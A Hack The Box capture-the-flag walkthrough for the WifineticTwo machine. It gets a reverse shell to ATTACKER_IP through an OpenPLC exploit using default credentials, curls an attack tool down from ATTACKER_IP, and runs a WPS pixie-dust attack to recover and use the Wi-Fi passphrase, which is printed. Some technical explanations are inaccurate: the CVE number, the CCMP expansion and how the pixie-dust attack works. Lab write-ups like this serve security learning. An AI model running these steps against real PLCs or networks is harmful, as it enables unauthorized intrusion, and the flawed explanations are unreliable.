# WifineticTwo Walkthrough

## Intro
Welcome to the  WifineticTwo challenge Walkthrough from HackTheBox, here is the link to the [room](https://app.hackthebox.com/machines/WifineticTwo)
In this room we are gonna practice with web applications vulnerabilities, exploit them to gain access to the machine and finally escalate privileges to get the root flag.

To interact with the machine connect via OpenVPN using the "lab" config profile.

Whenever you feel ready press "Join the Machine"

<br/>
<br/>

## The Challenge
Let's begin with a port scan with *nmap*
```bash
nmap -sV MACHINE_IP
```

Here is the scan report:
```
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy syn-ack ttl 63 Werkzeug/1.0.1 Python/2.7.18
```

We can now navigate to it, in your browser enter:
```
http://MACHINE-IP:8080
```

There is a login page of OpenPLC Webserver, with a quick search i found that the default credentials for login are openplc:openplc, i submitted them and got access to the dashboard.

Exploring the sections the "programs" one looks really interesting as it let's us upload programs and run them, maybe we can upload and trigger a reverse shell to connect to our machine.
In order to achieve that objective we first need to understand that we are in the field of PLC which are Programmable Logic Controllers, there are multiple programming languages we can use but looking at the program that was already updated we can see the `.st` extension which is used for Structured Text files.

From what i have found ST was based on and resembles traditional programming languages like Python, Java or C++.

Looks like that if we can modify the hardware code to make it interact with the custom file we upload we should be able to get our shell, but honestly is long and i am still learning C, so i searched if there were any known vulnerabilities and i found CVE-2021–49803 and on [ExploitDB](https://www.exploit-db.com/exploits/49803) there is also a python script.

Looking at it we have to make a little change, in line 34 it tries to compile a file called 681871.st, which i did not find, so i changed that name with the one of the file already located in the programs section "blank_program.st".

Set up a listener on your machine:
```bash
nc -lvnp 1234
```

Now we are ready to run it, modify the command with the right values:
```bash
python3 exploit.py -u http://MACHINE_IP:8080 -l openplc -p openplc -i ATTACKER_IP -r 1234"
```

Wait a couple of seconds and we have a shell as root user on this machine.
We can grab the first flag:
```bash
cat /root/user.txt
```
--> REDACTED

Running `ifconfig` i have noticed that our controller is connected to a WiFi network, i suppose that the Admin Controller will be in the same network and we have to reach it somehow.

Let's get more info about wlan0:
```bash
iw dev wlan0 scan
```

The interesting portion of the output is this one, telling us useful info about the "Robust Secure Network":
```
 RSN:  * Version: 1
   * Group cipher: CCMP
   * Pairwise ciphers: CCMP
   * Authentication suites: PSK
   * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)

 WPS:  * Version: 1.0
   * Wi-Fi Protected Setup State: 2 (Configured)
   * Response Type: 3 (AP)
```

It is running version 1, using CCMP (Cipher Block Chaining Message) and PSK (Pre-Shared Key) which in terms of security is not really the best, it is in fact old and surpassed because of the weak protection that provides in today's environment.

We can also notice that WPS, which is used to simplify the connection to the network is version 1 only which expose it to some types of attacks

Checking for known vulnerabilities an attack types and excluding the ones that do not really fit our situation i came up to one called *pixie dust attack*.
It works by sending a series of deauth packets to the router and then trying all possible combinations of the 8-digit WPS PIN until the correct one is found.

Now we need a tool to apply this attack to our situation, the first thing is to identify the network we want to attack

Get the *Oneshot* tool:
```bash
git clone https://github.com/kimocoder/OneShot.git
```

Now we need to transfer it into the target machine, `cd` into the directory and set up a simple python server:
```bash
python -m http.server
```

On the target 
```bash
cd /tmp
```
```bash
curl http://ATTACKER_IP:8000/oneshot.py -O oneshot.py
```

Let's discover the MAC address of the Access Point:
```bash
python3 oneshot.py -i wlan0
```
and click 1 when the network is found or use this command:
```bash
python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
```

Very quickly we get the PIN and the PSK
```
[+] WPS PIN: '12345670'
[+] WPA PSK:  REDACTED
[+] AP SSID:  REDACTED
```

With this credentials we can connect to the network:
```bash
wpa_passphrase <SSID> <PSK> > wpa.conf
wpa_supplicant -B -i <interface> -c wpa.conf
```
```bash
wpa_cli wps_reg <BSSID> <WPS_PIN>
```

which turns into:
```bash
wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! > wpa.conf
```
```bash
wpa_supplicant -B -i wlan0 -c wpa.conf
```

Now we can assign an IP address:
```bash
ifconfig wlan0 192.168.1.10 netmask 255.255.255.0
```


Now we can connect to the router via ssh:
```bash
ssh root@192.168.1.1
```

Let's get the root's flag:
```bash
cat /root/root.txt
```
--> REDACTED

<br>

Congratulations, you have completed this WiFi hacking challenge, i had a lot of fun doing it hope you did as well. <br>
If you wanna see more write ups you can check the WriteUps Directory in this GitHub repo. <br>
Catch you in the next CTF 😃 <br>
